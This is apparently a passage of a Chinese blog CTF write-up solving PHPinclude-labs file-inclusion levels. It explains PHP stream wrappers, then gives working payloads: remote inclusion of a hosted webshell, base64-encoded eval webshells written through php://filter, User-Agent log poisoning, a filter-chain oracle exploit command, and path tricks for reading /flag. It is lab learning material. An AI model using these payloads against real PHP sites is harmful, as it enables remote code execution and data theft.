+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="http-伪协议"><a href="#http-伪协议" class="headerlink" title="http://伪协议"></a><code>http://</code>伪协议</h3><p><strong>本地文件包含</strong></p>
+<p><code>http://</code> 是一个流包装器，用来把 HTTP 资源当作“文件”读取。它不是把浏览器跳转到该地址，而是由 PHP 服务器主动发起 HTTP 请求，允许 PHP 把一个远程 HTTP 地址当成文件来读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://example.com/test.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>执行流程是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP 服务器</span><br><span class="line">    → 请求 http://example.com/test.txt</span><br><span class="line">    ← 接收 HTTP 响应</span><br><span class="line">    → 读取响应正文</span><br></pre></td></tr></table></figure>
+
+<p>所以它读取的是<strong>远程服务器返回的内容</strong>，不是访问者电脑上的文件。</p>
+<p>常见用法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://example.com/a.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也可以：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;http://example.com/a.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>file_get_contents()</code> 或 <code>fopen()</code> 时，通常需要：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br></pre></td></tr></table></figure>
+
+<p>如果用于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;http://example.com/a.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>还需要：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
+
+<p>区别在于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://example.com/a.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>是把远程响应当作数据读取；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;http://example.com/a.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>则会把响应内容交给 PHP 的包含机制解析。远程服务器上的 PHP 文件通常会先被远程服务器执行，返回 HTML，因此本地一般拿不到它的 PHP 源码。</p>
+<p>和其他伪协议相比：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file://  → 读取本地文件</span><br><span class="line">data://  → 读取 URL 中直接写入的数据</span><br><span class="line">http://  → 通过网络读取远程 HTTP 内容</span><br></pre></td></tr></table></figure>
+
+<p>我们在提示中看到了一个<code>backdoor.txt</code> </p>
+<p>他的内容是要<code>post</code> ctf的值，这里考虑到给他传一个命令执行的参数，直接cat到flag</p>
+<p>所以要先构造一个<code>http://</code> 伪协议包含到这个<code>backdoor.txt</code> 让他当php命令执行（这里还没学习到）</p>
+<p><code>?wrappers=127.0.0.1/backdoor.txt</code></p>
+<p>然后再进行post ctf 的参数</p>
+<p><code>ctf=system(&#39;cat /flag&#39;);</code>就得到了flag</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103164629321.png" alt="image-20261103164629321"></p>
+<p>链条应该是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件包含</span><br><span class="line">→ 执行被包含的 PHP 代码</span><br><span class="line">→ PHP 代码调用 system/exec 等函数</span><br><span class="line">→ 执行操作系统命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="http-伪协议-1"><a href="#http-伪协议-1" class="headerlink" title="http://伪协议"></a><code>http://</code>伪协议</h3><p><strong>远程文件包含</strong></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103165534659.png" alt="image-20261103165534659"></p>
+<p>看到提示访问一下<code>challenge.txt</code> 得到了一段php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Key&#x27;</span>])&amp;&amp; <span class="number">1</span>==<span class="number">2</span> ? <span class="keyword">echo</span> <span class="string">&quot;&lt;?= system(&#x27;tac flag.???&#x27;);?&gt;&quot;</span> : <span class="keyword">die</span>(<span class="string">&#x27;Access Denied&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里分析一下这段代码，<code>1==2</code> 永远都是flase，根本不可能绕过</p>
+<p>探姬在远程放了一个木马</p>
+<p><code>raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI</code></p>
+<p>所以直接远程包含这个文件，这个里面有post参数是a，那么直接和上一题一样执行系统命令cat &#x2F;flag</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103170246765.png" alt="image-20261103170246765"></p>
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php://伪协议"></a><code>php://</code>伪协议</h3><table>
+<thead>
+<tr>
+<th>包装器</th>
+<th>主要功能</th>
+<th>常见用法</th>
+<th>关键说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php://input</code></td>
+<td>读取 HTTP 请求体的原始内容</td>
+<td><code>file_get_contents(&#39;php://input&#39;)</code></td>
+<td>只读；常用于读取 POST 原始数据</td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td>对其他流进行读取或写入过滤</td>
+<td><code>php://filter/read=convert.base64-encode/resource=flag.php</code></td>
+<td>常用于编码、解码、大小写转换和源码读取</td>
+</tr>
+<tr>
+<td><code>php://memory</code></td>
+<td>创建只存在于内存中的临时流</td>
+<td><code>fopen(&#39;php://memory&#39;, &#39;r+&#39;)</code></td>
+<td>可读写；每次打开通常是独立流</td>
+</tr>
+<tr>
+<td><code>php://temp</code></td>
+<td>创建临时流，超过限制后可写入临时文件</td>
+<td><code>fopen(&#39;php://temp&#39;, &#39;r+&#39;)</code></td>
+<td>默认超过一定大小后使用临时文件</td>
+</tr>
+<tr>
+<td><code>php://output</code></td>
+<td>直接写入 PHP 的输出缓冲</td>
+<td><code>fwrite(fopen(&#39;php://output&#39;,&#39;w&#39;), &#39;Hi&#39;)</code></td>
+<td>只写；效果类似输出内容</td>
+</tr>
+<tr>
+<td><code>php://stdin</code></td>
+<td>读取命令行标准输入</td>
+<td><code>fgets(STDIN)</code></td>
+<td>主要用于 CLI 命令行程序</td>
+</tr>
+<tr>
+<td><code>php://stdout</code></td>
+<td>写入命令行标准输出</td>
+<td><code>fwrite(STDOUT, &#39;Hi&#39;)</code></td>
+<td>主要用于 CLI</td>
+</tr>
+<tr>
+<td><code>php://stderr</code></td>
+<td>写入命令行错误输出</td>
+<td><code>fwrite(STDERR, &#39;Error&#39;)</code></td>
+<td>主要用于 CLI 报错或调试</td>
+</tr>
+<tr>
+<td><code>php://fd/N</code></td>
+<td>访问指定的文件描述符</td>
+<td><code>fopen(&#39;php://fd/3&#39;, &#39;r&#39;)</code></td>
+<td><code>N</code> 是操作系统文件描述符编号</td>
+</tr>
+</tbody></table>
+<p><code>php://input</code> 表示“当前 HTTP 请求的原始请求体”。</p>
+<p>普通读取方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$body = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">echo $body;</span><br></pre></td></tr></table></figure>
+
+<p>如果客户端发送：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
+
+<p>那么：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(&#x27;php://input&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>得到的就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br></pre></td></tr></table></figure>
+
+<p>它和 <code>$_POST</code> 的区别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST</span><br></pre></td></tr></table></figure>
+
+<p>读取的是 PHP 解析后的表单参数，而：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br></pre></td></tr></table></figure>
+
+<p>读取的是原始请求体。</p>
+<p>例如 JSON 请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;alice&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以这样读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$data = json_decode(</span><br><span class="line">    file_get_contents(&#x27;php://input&#x27;),</span><br><span class="line">    true</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo $data[&#x27;name&#x27;];</span><br></pre></td></tr></table></figure>
+
+<p>在文件包含场景中，如果代码是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;php://input&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>那么 PHP 会把请求体当作被包含文件处理。比如请求体是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;OK&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>就可能执行这段代码</p>
+<p><code>php://filter</code> 是一个“过滤器包装器”。它会在读取或写入目标资源时，先对数据进行转换。它本身不代表某个文件，真正的文件由 <code>resource=</code> 指定</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/[过滤器参数]/resource=目标资源</span></span><br><span class="line">php:<span class="comment">//filter/read=过滤器/resource=文件</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=secret.php</span></span><br></pre></td></tr></table></figure>
+
+<p>常用的过滤器</p>
+<table>
+<thead>
+<tr>
+<th>过滤器</th>
+<th>功能</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>convert.base64-encode</code></td>
+<td>Base64 编码</td>
+<td><code>read=convert.base64-encode</code></td>
+</tr>
+<tr>
+<td><code>convert.base64-decode</code></td>
+<td>Base64 解码</td>
+<td><code>read=convert.base64-decode</code></td>
+</tr>
+<tr>
+<td><code>string.rot13</code></td>
+<td>ROT13 转换</td>
+<td><code>read=string.rot13</code></td>
+</tr>
+<tr>
+<td><code>string.toupper</code></td>
+<td>转换为大写</td>
+<td><code>read=string.toupper</code></td>
+</tr>
+<tr>
+<td><code>string.tolower</code></td>
+<td>转换为小写</td>
+<td><code>read=string.tolower</code></td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174408830.png" alt="image-20261103174408830"></p>
+<p>这里直接构造<code>?wrappers=filter/read=convert.base64-encode/resource=/flag</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174445026.png" alt="image-20261103174445026"></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174458081.png" alt="image-20261103174458081"></p>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="php-伪协议-1"><a href="#php-伪协议-1" class="headerlink" title="php://伪协议"></a><code>php://</code>伪协议</h3><p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103174908375.png" alt="image-20261103174908375"></p>
+<p>这个题目看到是<code>php://input</code> 得用post</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103175917040.png" alt="image-20261103175917040"></p>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="php-伪协议-2"><a href="#php-伪协议-2" class="headerlink" title="php://伪协议"></a><code>php://</code>伪协议</h3><p>直接构造<code>?wrappers=filter/read=convert.base64-encode/resource=/flag</code></p>
+<p>然后base64解码得到flag</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103180645672.png" alt="image-20261103180645672"></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103180655699.png" alt="image-20261103180655699"></p>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="php-伪协议-3"><a href="#php-伪协议-3" class="headerlink" title="php://伪协议"></a><code>php://</code>伪协议</h3><p>和上一个题目的构造是一样的，然后base64解码</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103180835766.png" alt="image-20261103180835766"></p>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents() 函数"></a><code>file_get_contents()</code> 函数</h3><p><code>file_get_contents()</code> 的作用是：<strong>读取整个资源，并把内容作为字符串返回</strong>。</p>
+<p>基本用法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;test.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></figure>
+
+<p>它也支持各种 PHP 流包装器：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);                         <span class="comment">// 本地文件</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;file:///tmp/a.txt&#x27;</span>);             <span class="comment">// file 包装器</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://example.com/a.txt&#x27;</span>);      <span class="comment">// HTTP 资源</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);                   <span class="comment">// 原始请求体</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(</span><br><span class="line">    <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span></span><br><span class="line">);                                                  <span class="comment">// 经过过滤器读取</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103181223535.png" alt="image-20261103181223535"></p>
+<p>直接<code>file=/flag</code>也可以</p>
+<p>直接构造<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code> 也可以</p>
+<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a><code>file_put_contents()</code>函数</h3><p><code>file_put_contents()</code> 用来把数据写入文件</p>
+<p><code>file_put_contents($filename, $data);</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103182858012.png" alt="image-20261103182858012"></p>
+<p>那么我们可以先用<code>?filename=php://filter/write=convert.base64-decode/resource=shell.php</code></p>
+<p>它不是普通的 <code>shell.php</code>，而是告诉 PHP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入数据时，先进行 Base64 解码，</span><br><span class="line">然后把解码结果写入 shell.php</span><br></pre></td></tr></table></figure>
+
+<p>写入一个<code>shell.php</code>然后给这个post一个<code>data=PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4</code></p>
+<p><code>PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4</code>(<?php eval($_POST['1']);?>)</p>
+<p>因为也是一样过滤了等号，所以这样写入，然后访问一下<code>shell.php</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103183147887.png" alt="image-20261103183147887"></p>
+<p>整个过程可以分成两步：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一步：写入阶段</span><br><span class="line">Base64 字符串 → 解码 → 保存为 shell.php</span><br><span class="line"></span><br><span class="line">第二步：访问阶段</span><br><span class="line">访问 shell.php → PHP 解释其中的代码</span><br></pre></td></tr></table></figure>
+
+<p>然后给1传一下命令</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103183304383.png" alt="image-20261103183304383"></p>
+<h2 id="level11plus"><a href="#level11plus" class="headerlink" title="level11plus"></a>level11plus</h2><h3 id="自定义过滤"><a href="#自定义过滤" class="headerlink" title="自定义过滤"></a>自定义过滤</h3><p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103184956055.png" alt="image-20261103184956055"></p>
+<p>这里在file_put_contents()函数的data前面加上了一个php的代码，不管怎么样这段代码都是插在data前面的</p>
+<p>我们想一下之前是怎么做的<code>?filename=php://filter/write=convert.base64-decode/resource=shell.php</code></p>
+<p>先写进去一个shell，data进去的时候进行base64解码，但是这里被添加了一块php代码，我们直接还是采用这样的方式，这段代码也是要直接被base64解码的，那么这段代码就会被解释成一些乱码，因为它原本不是base64加密过的密文，那么解码之后肯定就会是乱的</p>
+<p>那么还是这样构造</p>
+<p>然后给data传base64加密后的参数<code>data=aaPD9waHAgQGV2YWwoJF9QT1NUWydhdyddKTsgPz4</code></p>
+<p>这里等于<code>&lt;?php @eval($_POST[&#39;aw&#39;]); ?&gt;</code></p>
+<p>然后就是和上一道一样了，给aw传参数查看flag</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103185520836.png" alt="**image-20261103185520836**"></p>
+<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103183904265.png" alt="image-20261103183904265"></p>
+<p>代码中已经包含了远程文件，直接POST参数a即可</p>
+<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="LFI日志文件包含Nginx"><a href="#LFI日志文件包含Nginx" class="headerlink" title="LFI日志文件包含Nginx"></a>LFI日志文件包含Nginx</h3><p>可以利用 Nginx 的访问日志作为“可写文件”。</p>
+<p>User-Agent 只是一个方便注入的位置。它本来用于表示浏览器信息，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0</span><br></pre></td></tr></table></figure>
+
+<p>但它由客户端发送，可以修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;?= &quot;OK&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Nginx 通常会把 User-Agent 记录到访问日志中。于是日志里会出现类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 ... &quot;GET / HTTP/1.1&quot; ... &quot;&lt;?= &quot;OK&quot;; ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>接着程序执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;/var/log/nginx/access.log&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>PHP 会把整个日志当作 PHP 文件解析，于是日志中的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= &quot;OK&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>就会执行</p>
+<p>使用的流程是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;?= @eval($_POST[&#x27;1&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先写入 Nginx 日志，再请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>并提交：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103192024149.png" alt="image-20261103192024149"></p>
+<p>这里不知道过滤了啥玩意，直接包含flag也可以出来</p>
+<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="LFI日志文件包含Apache"><a href="#LFI日志文件包含Apache" class="headerlink" title="LFI日志文件包含Apache"></a>LFI日志文件包含Apache</h3><p>和上一道题同样的流程</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261103193150218.png" alt="image-20261103193150218"></p>
+<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h3><p>session文件包含整不出来，直接<code>?file=/flag</code>出flag了</p>
+<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>直接<code>?file=/flag</code>出flag了,可能是有点问题</p>
+<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>使用了官方提供的 Filter Chain Oracle 脚本，目标参数是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 filters_chain_oracle_exploit.py \</span><br><span class="line">  --target &#x27;http://80-afe84092-ed42-4cfc-a366-b672eeded31a.challenge.ctfplus.cn/&#x27; \</span><br><span class="line">  --file /flag \</span><br><span class="line">  --parameter file</span><br></pre></td></tr></table></figure>
+
+<p>因为代码通过 POST 的 <code>file</code> 参数调用 <code>file()</code>，脚本利用 <code>php://filter</code> 链让响应差异充当字符判断 Oracle，逐字符读取 <code>/flag</code>。</p>
+<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><h3 id="require-include-once-缺陷"><a href="#require-include-once-缺陷" class="headerlink" title="require&#x2F;include_once 缺陷"></a>require&#x2F;include_once 缺陷</h3><p>第一次已经包含,直接再次包含 <code>flag.php</code> 会被跳过。利用 <code>/proc/self/root</code> 的多级符号链接，让 PHP 判重时看到“不同路径”，但实际仍指向同一个文件。重复约 25次是因为每个 <code>/proc/self/root</code> 涉及多级符号链接，超过 PHP 的路径解析限制后，判重哈希中的路径与第一次包含的路径不同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><p><code>?file=../../../flag</code></p>
+<p>后面不会了，学会了再补</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/11/02/file-upload-security/" rel="prev" title="文件上传安全：Upload-Labs 绕过思路与防御">
+                  <i class="fa fa-angle-left"></i> 文件上传安全：Upload-Labs 绕过思路与防御
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">HanLior</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div><div class="busuanzi-count" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 0.8em;">
+  <span>本站访客：<span id="busuanzi_site_uv">加载中…</span> 人</span>
+  <span>总浏览量：<span id="busuanzi_site_pv">加载中…</span> 次</span>
+</div>
+<div style="text-align: center; margin-top: 0.4em;">
+  博客运行时间：<span id="blog-runtime">计算中…</span>
+</div>
+<script>
+  (function () {
+    var startTime = Date.UTC(2026, 9, 16, 10, 48, 16); // 2026-10-16 18:48:16 Asia/Shanghai
+    var runtime = document.getElementById('blog-runtime');
+
+    function updateRuntime() {
+      var elapsed = Math.max(0, Date.now() - startTime);
+      var seconds = Math.floor(elapsed / 1000);
+      var days = Math.floor(seconds / 86400);
+      var hours = Math.floor((seconds % 86400) / 3600);
+      var minutes = Math.floor((seconds % 3600) / 60);
+      var remainingSeconds = seconds % 60;
+      runtime.textContent = days + ' 天 ' + hours + ' 小时 ' + minutes + ' 分钟 ' + remainingSeconds + ' 秒';
+    }
+
+    updateRuntime();
+    window.setInterval(updateRuntime, 1000);
+  })();
+</script>
+<script defer src="https://busuanzi.meuicat.com/js"></script>
+<script>
+  window.setTimeout(function () {
+    ['busuanzi_site_uv', 'busuanzi_site_pv'].forEach(function (id) {
+      var counter = document.getElementById(id);
+      if (counter && counter.textContent === '加载中…') {
+        counter.textContent = '暂不可用';
+      }
+    });
+  }, 10000);
+</script>
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
